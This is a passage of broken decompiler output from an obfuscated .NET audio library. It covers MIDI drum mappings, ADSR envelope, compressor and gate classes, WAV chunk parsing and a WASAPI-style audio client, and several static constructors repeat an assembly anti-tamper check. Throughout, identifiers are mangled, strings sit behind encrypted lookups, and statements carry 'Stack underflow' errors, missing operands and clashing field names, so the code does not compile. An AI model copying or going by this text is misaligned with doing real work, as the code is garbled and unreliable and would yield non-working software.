				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0018)/*Error near IL_0009: Stack underflow*/)._0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override string _0002()
		{
			//IL_007e: Incompatible stack heights: 0 vs 2
			//IL_0081: Incompatible stack heights: 0 vs 4
			//IL_0088: Incompatible stack heights: 0 vs 1
			_ = _009E._0094_0004;
			_0080._0014._0001(107406866);
			_ = new object[7];
			_ = 0;
			_ = ((_0018)/*Error near IL_0088: Stack underflow*/).NoteName;
			((object[])/*Error near IL_0019: Stack underflow*/)[/*Error near IL_0019: Stack underflow*/] = (object)/*Error near IL_0019: Stack underflow*/;
			((object[])/*Error near IL_0019: Stack underflow*/)[1] = InNote;
			((object[])/*Error near IL_0027: Stack underflow*/)[2] = OutNote;
			((object[])/*Error near IL_0035: Stack underflow*/)[3] = Channel;
			((object[])/*Error near IL_0043: Stack underflow*/)[4] = OutPort;
			((object[])/*Error near IL_0051: Stack underflow*/)[5] = VelocityAdjust;
			((object[])/*Error near IL_005f: Stack underflow*/)[6] = VelocityScale * 100f;
			return /*Error near IL_0078: Stack underflow*/((string)/*Error near IL_0078: Stack underflow*/, (object[])/*Error near IL_0078: Stack underflow*/);
		}
	}
}
namespace _001E
{
	internal sealed class _0010
	{
		internal int _0001;

		private readonly List<global::_000E._0018> m__0001;

		internal _001F._0013 _0001;

		internal _001F._0013 _0002;

		internal _001F._0013 _0003;

		internal _001F._0013 _0004;

		internal _001F._0013 _0005;

		internal _001F._0013 _0006;

		internal int _0002;

		internal int _0003;

		internal int _0004;

		internal string _0001;

		public List<global::_000E._0018> DrumMappings => ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0010(string _0096_0093)
		{
			using BinaryReader binaryReader = new BinaryReader(File.OpenRead(_0096_0093), Encoding.Unicode);
			this.m__0001 = new List<global::_000E._0018>();
			global::_0011._0018._0001(binaryReader, this);
			for (int i = 0; i < this._0001; i++)
			{
				this.m__0001.Add(global::_0011._0018._0001(this, binaryReader));
			}
			global::_0011._0018._0001(binaryReader, this);
			global::_0011._0018._0001(this, binaryReader);
			if (binaryReader.BaseStream.Position != binaryReader.BaseStream.Length)
			{
				global::_0011._0018._0001(this, binaryReader);
				if (binaryReader.BaseStream.Position != binaryReader.BaseStream.Length)
				{
					global::_0011._0018._0001(this, binaryReader);
				}
			}
		}

		public override string _0001()
		{
			//IL_016b: Incompatible stack heights: 0 vs 1
			//IL_0177: Incompatible stack heights: 0 vs 2
			new StringBuilder();
			StringBuilder stringBuilder = (StringBuilder)/*Error near IL_0171: Stack underflow*/;
			_ = _008C_0002._007E_0095_0005;
			string text = _0080._0014._0001(107407273);
			_001F._0013 obj = this._0001;
			/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, text, obj);
			_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107407280), this._0002);
			_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107407255), this._0001);
			foreach (global::_000E._0018 item in this.m__0001)
			{
				_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107407226), item);
			}
			_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107407173), this._0003);
			_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107407144), this._0001);
			_0088_0003._007E_0082_0007(stringBuilder, _0080._0014._0001(107407155), this._0004, _0002);
			_0088_0003._007E_0082_0007(stringBuilder, _0080._0014._0001(107406566), _0005, _0003);
			_0088_0003._007E_0082_0007(stringBuilder, _0080._0014._0001(107406553), _0006, _0004);
			return global::_0002._007E_0006(stringBuilder);
		}

		static _0010()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001F
{
	internal sealed class _0013
	{
		internal int _0001;

		internal int _0002;

		internal short _0001;

		internal short _0002;

		public int Length => ((_0013)/*Error near IL_0007: Stack underflow*/)._0001;

		public override string _0001()
		{
			//IL_0057: Incompatible stack heights: 0 vs 2
			//IL_005a: Incompatible stack heights: 0 vs 4
			//IL_005d: Incompatible stack heights: 0 vs 3
			_ = _009E._0094_0004;
			_0080._0014._0001(107406476);
			_ = new object[4];
			_ = 0;
			object obj = ((_0013)/*Error near IL_001b: Stack underflow*/)._0001;
			((object[])/*Error near IL_0021: Stack underflow*/)[/*Error near IL_0021: Stack underflow*/] = obj;
			/*Error near IL_0021: Stack underflow*/;
			_ = 1;
			object obj2 = ((_0013)/*Error near IL_002a: Stack underflow*/)._0002;
			((object[])/*Error near IL_0030: Stack underflow*/)[/*Error near IL_0030: Stack underflow*/] = obj2;
			((object[])/*Error near IL_0030: Stack underflow*/)[2] = this._0001;
			((object[])/*Error near IL_003e: Stack underflow*/)[3] = _0002;
			return /*Error near IL_0051: Stack underflow*/((string)/*Error near IL_0051: Stack underflow*/, (object[])/*Error near IL_0051: Stack underflow*/);
		}
	}
}
namespace _0001
{
	internal sealed class _0015
	{
		internal global::_0005._0005 _0001;

		internal long _0001;

		internal long _0002;

		internal List<global::_0004._000E> _0001;

		internal readonly bool _0001;

		internal bool _0002;

		internal readonly bool _0003;

		internal long _0003;

		public global::_0005._0005 WaveFormat => ((_0015)/*Error near IL_0007: Stack underflow*/)._0001;

		public long DataChunkPosition => ((_0015)/*Error near IL_0007: Stack underflow*/)._0001;

		public long DataChunkLength => ((_0015)/*Error near IL_0007: Stack underflow*/)._0002;

		public List<global::_0004._000E> RiffChunks => ((_0015)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0015()
		{
			this._0003 = true;
			_0001 = false;
		}

		static _0015()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _001D
{
	internal sealed class _0014
	{
		public enum _0001
		{
			_0001,
			_0002,
			_0003,
			_0004,
			_0005
		}

		internal _0001 _0001;

		internal float _0001;

		private float _0002;

		private float _0003;

		private float _0004;

		internal float _0005;

		internal float _0006;

		internal float _0007;

		internal float _0008;

		internal float _000E;

		internal float _000F;

		internal float _0010;

		internal float _0011;

		internal float _0012;

		public float AttackRate
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0014)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_003d: Incompatible stack heights: 0 vs 1
				//IL_0040: Incompatible stack heights: 0 vs 1
				//IL_0043: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0009: Stack underflow*/)._0002 = (float)/*Error near IL_0009: Stack underflow*/;
				float num = global::_0011._0018._0001(value, _000E);
				((_0014)/*Error near IL_001c: Stack underflow*/)._0005 = num;
				_0010 = (1f + _000E) * (1f - _0005);
			}
		}

		public float DecayRate
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0014)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			set
			{
				//IL_003e: Incompatible stack heights: 0 vs 1
				//IL_0041: Incompatible stack heights: 0 vs 1
				//IL_0044: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0009: Stack underflow*/)._0003 = (float)/*Error near IL_0009: Stack underflow*/;
				float num = global::_0011._0018._0001(value, _000F);
				((_0014)/*Error near IL_001c: Stack underflow*/)._0006 = num;
				_0011 = (_0008 - _000F) * (1f - _0006);
			}
		}

		public float ReleaseRate
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0014)/*Error near IL_0007: Stack underflow*/)._0004;
			}
			set
			{
				//IL_0038: Incompatible stack heights: 0 vs 1
				//IL_003b: Incompatible stack heights: 0 vs 1
				//IL_003e: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0009: Stack underflow*/)._0004 = (float)/*Error near IL_0009: Stack underflow*/;
				float num = global::_0011._0018._0001(value, _000F);
				((_0014)/*Error near IL_001c: Stack underflow*/)._0007 = num;
				_0012 = (0f - _000F) * (1f - _0007);
			}
		}

		public float SustainLevel
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0014)/*Error near IL_0007: Stack underflow*/)._0008;
			}
			set
			{
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_002f: Incompatible stack heights: 0 vs 1
				//IL_0032: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0009: Stack underflow*/)._0008 = (float)/*Error near IL_0009: Stack underflow*/;
				float num = _0008 - _000F;
				float num2 = _0006;
				((_0014)/*Error near IL_002a: Stack underflow*/)._0011 = num * (1f - num2);
			}
		}

		public _0001 State => ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0014()
		{
			global::_0011._0018._0001(this);
			AttackRate = 0f;
			DecayRate = 0f;
			ReleaseRate = 0f;
			SustainLevel = 1f;
			global::_0011._0018._0001(0.3f, this);
			global::_0011._0018._0001(this, 0.0001f);
		}
	}
}
namespace _000E
{
	internal sealed class _0019
	{
		internal sealed class _0001
		{
			internal double _0001;

			internal double _0002;

			internal double _0003;

			internal double _0004;

			internal double _0005;

			internal double _0006;

			internal double[,] _0001;

			public _0001()
			{
				this._0001 = -1.0;
				_0001 = new double[256, 4];
			}
		}

		private const int m__0001 = 4;

		private const int _0002 = 64;

		private const double m__0001 = Math.PI;

		internal double _0002;

		internal double _0003;

		internal double _0004;

		internal double _0005;

		internal double _0006;

		internal float _0001;

		internal float _0002;

		internal float[] _0001;

		internal float[] _0002;

		internal _0001 _0001;

		internal int _0003;

		internal int _0004;

		internal int _0005;

		internal int _0006;

		internal int _0007;

		internal int _0008;

		internal int _000E;

		internal int _000F;

		internal bool _0001;

		internal bool _0002;

		public _0019()
		{
			this._0001 = 0.707f;
			this._0002 = 0.693f;
			_000F = 0;
			_0007 = 1;
			_0008 = 0;
			_000E = 1;
			this._0001 = true;
			_0002 = false;
			_0003 = 0;
			this._0002 = 44100.0;
			this._0003 = 44100.0;
			this._0005 = 1.0;
			this._0006 = -1.0;
			global::_0011._0018._0001(0.0, this);
		}

		static _0019()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001D
{
	internal sealed class _0015
	{
		private static int _0001 = 16000;

		internal float[] _0001 = new float[_0015._0001];

		internal float[] _0002 = new float[_0015._0001];

		internal float[] _0003 = new float[2 * _0015._0001];

		internal float[] _0004 = new float[_0015._0001 / 2 + 1];

		internal float[] _0005 = new float[_0015._0001 / 2 + 1];

		internal float[] _0006 = new float[2 * _0015._0001];

		internal float[] _0007 = new float[_0015._0001];

		internal float[] _0008 = new float[_0015._0001];

		internal float[] _000E = new float[_0015._0001];

		internal float[] _000F = new float[_0015._0001];

		internal long _0001;
	}
	internal sealed class _0016
	{
		internal double _0001;

		internal double _0002;

		internal double _0003;

		internal double _0004;

		internal double _0005;

		internal float _0001;

		internal float _0002;

		internal float _0003;

		internal float _0004;

		internal _0016()
		{
			_0001 = (_0002 = 0f);
			_0003 = (_0004 = 0f);
		}

		internal _0016(double _009B_009A_0002, double _001E_0093, double _001F_0093, double _0087_0091_0006, double _0088_0091_0006, double _0089_0091_0006)
		{
			global::_0011._0018._0001(_0087_0091_0006, this, _0089_0091_0006, _001E_0093, _009B_009A_0002, _001F_0093, _0088_0091_0006);
			_0001 = (_0002 = 0f);
			_0003 = (_0004 = 0f);
		}

		static _0016()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0013
{
	internal struct _0014
	{
		public float _0001;

		public float _0002;
	}
}
namespace _007F
{
	internal sealed class _0013
	{
		internal double _0001;

		internal double _0002;

		internal double _0003;

		public double TimeConstant
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0013)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				((_0013)/*Error near IL_0009: Stack underflow*/)._0002 = (double)/*Error near IL_0009: Stack underflow*/;
				global::_0011._0018._0001((_0013)/*Error near IL_0010: Stack underflow*/);
			}
		}

		public double SampleRate
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0013)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				((_0013)/*Error near IL_0009: Stack underflow*/)._0001 = (double)/*Error near IL_0009: Stack underflow*/;
				global::_0011._0018._0001((_0013)/*Error near IL_0010: Stack underflow*/);
			}
		}

		public _0013()
			: this(1.0, 44100.0)
		{
		}

		public _0013(double _009D_0092_0005, double _008E_008F_0006)
		{
			_0001 = _008E_008F_0006;
			_0002 = _009D_0092_0005;
			global::_0011._0018._0001(this);
		}
	}
}
namespace _0002
{
	internal class _0013
	{
		protected const double _0001 = 1E-25;

		internal readonly _007F._0013 _0001;

		internal readonly _007F._0013 _0002;

		public double Attack
		{
			get
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				return ((_0013)/*Error near IL_0007: Stack underflow*/)._0001._0002;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 2
				_ = ((_0013)/*Error near IL_0007: Stack underflow*/)._0001;
				((_007F._0013)/*Error near IL_0017: Stack underflow*/).TimeConstant = (double)/*Error near IL_0017: Stack underflow*/;
			}
		}

		public double Release
		{
			get
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				return ((_0013)/*Error near IL_0007: Stack underflow*/)._0002._0002;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 2
				_ = ((_0013)/*Error near IL_0007: Stack underflow*/)._0002;
				((_007F._0013)/*Error near IL_0017: Stack underflow*/).TimeConstant = (double)/*Error near IL_0017: Stack underflow*/;
			}
		}

		public double SampleRate
		{
			get
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				return ((_0013)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			}
			set
			{
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0022: Incompatible stack heights: 0 vs 2
				//IL_0025: Incompatible stack heights: 0 vs 2
				_ = ((_0013)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0013)/*Error near IL_000e: Stack underflow*/)._0002;
				((_007F._0013)/*Error near IL_0017: Stack underflow*/).SampleRate = (double)/*Error near IL_0017: Stack underflow*/;
				((_007F._0013)/*Error near IL_001d: Stack underflow*/).SampleRate = value;
			}
		}

		public _0013(double _008A_0091_0006, double _008B_0091_0006, double _008E_008F_0006)
		{
			_0001 = new _007F._0013(_008A_0091_0006, _008E_008F_0006);
			_0002 = new _007F._0013(_008B_0091_0006, _008E_008F_0006);
		}

		static _0013()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
	internal static class _0014
	{
	}
}
namespace _0001
{
	internal sealed class _0016
	{
		static _0016()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _001A
{
	internal sealed class _0011 : global::_0002._0013
	{
		internal new double _0001;

		[CompilerGenerated]
		private new double _0002;

		[CompilerGenerated]
		private double _0003;

		[CompilerGenerated]
		private double _0004;

		public double MakeUpGain
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0011)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0011)/*Error near IL_0009: Stack underflow*/)._0002 = (double)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public double Threshold
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0011)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0011)/*Error near IL_0009: Stack underflow*/)._0003 = (double)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public double Ratio
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0011)/*Error near IL_0007: Stack underflow*/)._0004;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0011)/*Error near IL_0009: Stack underflow*/)._0004 = (double)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0011(double _008C_0091_0006, double _008D_0091_0006, double _008E_008F_0006)
			: base(_008C_0091_0006, _008D_0091_0006, _008E_008F_0006)
		{
			Threshold = 0.0;
			Ratio = 1.0;
			MakeUpGain = 0.0;
			_0001 = 1E-25;
		}

		public _0011()
			: base(10.0, 10.0, 44100.0)
		{
			Threshold = 0.0;
			Ratio = 1.0;
			MakeUpGain = 0.0;
			_0001 = 1E-25;
		}
	}
}
namespace _001C
{
	internal sealed class _0010 : global::_0002._0013
	{
		private new double _0001;

		internal new double _0002;

		internal double _0003;

		public double Threshold
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0018: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				//IL_001e: Incompatible stack heights: 0 vs 1
				((_0010)/*Error near IL_0009: Stack underflow*/)._0001 = (double)/*Error near IL_0009: Stack underflow*/;
				double num = global::_0011._0018._0001(value);
				((_0010)/*Error near IL_0016: Stack underflow*/)._0002 = num;
			}
		}

		public _0010()
			: base(10.0, 10.0, 44100.0)
		{
			_0001 = 0.0;
			_0002 = 1.0;
			_0003 = 1E-25;
		}

		static _0010()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0015
{
	internal sealed class _0012 : IDisposable
	{
		internal global::_0012._0010 _0001;

		internal _0012(global::_0012._0010 _008E_0091_0006)
		{
			this._0001 = _008E_0091_0006;
		}

		public void _0001()
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 2
			//IL_0036: Incompatible stack heights: 0 vs 1
			if (((_0012)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = _0098._008A_0004;
				global::_0012._0010 obj = ((_0012)/*Error near IL_0015: Stack underflow*/)._0001;
				/*Error near IL_0036: Stack underflow*/(obj);
				this._0001 = null;
				_0091_0002._009B_0005(this);
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}
	}
}
namespace _0007
{
	internal sealed class _0014 : IDisposable
	{
		internal global::_001A._0013 _0001;

		internal global::_0005._0005 _0001;

		private global::_0005._0014 m__0001;

		private global::_0015._0012 m__0001;

		private global::_001E._0011 m__0001;

		private global::_000E._001A m__0001;

		internal global::_0003._000F _0001;

		public global::_0005._0005 MixFormat
		{
			get
			{
				//IL_003f: Incompatible stack heights: 0 vs 1
				//IL_0042: Incompatible stack heights: 0 vs 2
				//IL_0049: Incompatible stack heights: 0 vs 1
				if (((_0014)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					_ = global::_0007._0097;
					((_0014)/*Error near IL_0015: Stack underflow*/)._0001._0001(out IntPtr intPtr);
					/*Error near IL_001e: Stack underflow*/((int)/*Error near IL_001e: Stack underflow*/);
					global::_0005._0005 obj = global::_0011._0018._0001(intPtr);
					_009B._0091_0004(intPtr);
					this._0001 = obj;
				}
				return this._0001;
			}
		}

		public int BufferSize
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0014)/*Error near IL_000c: Stack underflow*/)._0001._0001(out uint result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return (int)result;
			}
		}

		public long StreamLatency
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0007: Stack underflow*/)._0001._0001();
				return (long)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public int CurrentPadding
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0014)/*Error near IL_000c: Stack underflow*/)._0001._0001(out int result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		public long DefaultDevicePeriod
		{
			get
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0014)/*Error near IL_000c: Stack underflow*/)._0001._0001(out var result, out var _);
				/*Error near IL_0025: Stack underflow*/((int)/*Error near IL_0025: Stack underflow*/);
				return result;
			}
		}

		public long MinimumDevicePeriod
		{
			get
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0014)/*Error near IL_000c: Stack underflow*/)._0001._0001(out var _, out var result);
				/*Error near IL_0025: Stack underflow*/((int)/*Error near IL_0025: Stack underflow*/);
				return result;
			}
		}

		public global::_000E._001A AudioStreamVolume
		{
			get
			{
				//IL_005e: Incompatible stack heights: 0 vs 1
				//IL_0065: Incompatible stack heights: 0 vs 1
				//IL_006c: Incompatible stack heights: 0 vs 1
				if (((_0014)/*Error near IL_0007: Stack underflow*/)._0001 == global::_0003._000F._0002)
				{
					_0080._0014._0001(107388737);
					new InvalidOperationException((string?)/*Error near IL_006c: Stack underflow*/);
					throw /*Error near IL_0014: Stack underflow*/;
				}
				if (this.m__0001 == null)
				{
					Guid guid = new Guid(_0080._0014._0001(107406443));
					global::_0007._0097(this._0001._0001(guid, out var obj));
					this.m__0001 = new global::_000E._001A((global::_0014._0013)obj);
				}
				return this.m__0001;
			}
		}

		public unsafe global::_001E._0011 AudioClockClient
		{
			get
			{
				//IL_0045: Incompatible stack heights: 0 vs 1
				//IL_004c: Incompatible stack heights: 0 vs 2
				if (((_0014)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					Guid guid = default(Guid);
					_ = ref guid;
					_0080._0014._0001(107406426);
					*(Guid*)/*Error near IL_0053: Stack underflow*/ = new Guid((string)/*Error near IL_0053: Stack underflow*/);
					global::_0007._0097(this._0001._0001(guid, out var obj));
					this.m__0001 = new global::_001E._0011((global::_0019._0018)obj);
				}
				return this.m__0001;
			}
		}

		public unsafe global::_0005._0014 AudioRenderClient
		{
			get
			{
				//IL_0045: Incompatible stack heights: 0 vs 1
				//IL_004c: Incompatible stack heights: 0 vs 2
				if (((_0014)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					Guid guid = default(Guid);
					_ = ref guid;
					_0080._0014._0001(107406345);
					*(Guid*)/*Error near IL_0053: Stack underflow*/ = new Guid((string)/*Error near IL_0053: Stack underflow*/);
					global::_0007._0097(this._0001._0001(guid, out var obj));
					this.m__0001 = new global::_0005._0014((global::_0012._0011)obj);
				}
				return this.m__0001;
			}
		}

		public unsafe global::_0015._0012 AudioCaptureClient
		{
			get
			{
				//IL_0045: Incompatible stack heights: 0 vs 1
				//IL_004c: Incompatible stack heights: 0 vs 2
				if (((_0014)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					Guid guid = default(Guid);
					_ = ref guid;
					_0080._0014._0001(107406840);
					*(Guid*)/*Error near IL_0053: Stack underflow*/ = new Guid((string)/*Error near IL_0053: Stack underflow*/);
					global::_0007._0097(this._0001._0001(guid, out var obj));
					this.m__0001 = new global::_0015._0012((global::_0012._0010)obj);
				}
				return this.m__0001;
			}
		}

		internal _0014(global::_001A._0013 _008F_0091_0006)
		{
			this._0001 = _008F_0091_0006;
		}

		public void _0001()
		{
			//IL_00a4: Incompatible stack heights: 0 vs 1
			//IL_00aa: Incompatible stack heights: 0 vs 1
			//IL_00b0: Incompatible stack heights: 0 vs 1
			if (((_0014)/*Error near IL_000a: Stack underflow*/)._0001 != null)
			{
				if (((_0014)/*Error near IL_0019: Stack underflow*/).m__0001 != null)
				{
					((_0014)/*Error near IL_0025: Stack underflow*/).m__0001._0001();
					this.m__0001 = null;
				}
				if (this.m__0001 != null)
				{
					this.m__0001._0001();
					this.m__0001 = null;
				}
				if (this.m__0001 != null)
				{
					this.m__0001._0001();
					this.m__0001 = null;
				}
				if (this.m__0001 != null)
				{
					this.m__0001._0001();
					this.m__0001 = null;
				}
				_0098._008A_0004(this._0001);
				this._0001 = null;
				_0091_0002._009B_0005(this);
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		static _0014()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
